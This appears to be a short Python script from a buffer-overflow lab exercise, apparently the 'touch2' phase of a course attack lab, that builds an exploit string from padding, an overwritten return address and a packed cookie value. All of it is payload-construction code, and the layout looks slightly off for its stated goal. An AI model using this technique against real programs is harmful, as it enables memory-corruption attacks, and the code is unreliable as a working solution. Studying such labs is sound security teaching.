import struct

buffer_size = 0x18
touch2_addr = 0x401989  # Replace this with the actual address of your l2d.o code

padding = b'A' * buffer_size
return_addr = struct.pack('<Q', touch2_addr)
cookie_value = struct.pack('<I', 0x16805896)

exploit_str = padding + return_addr + cookie_value

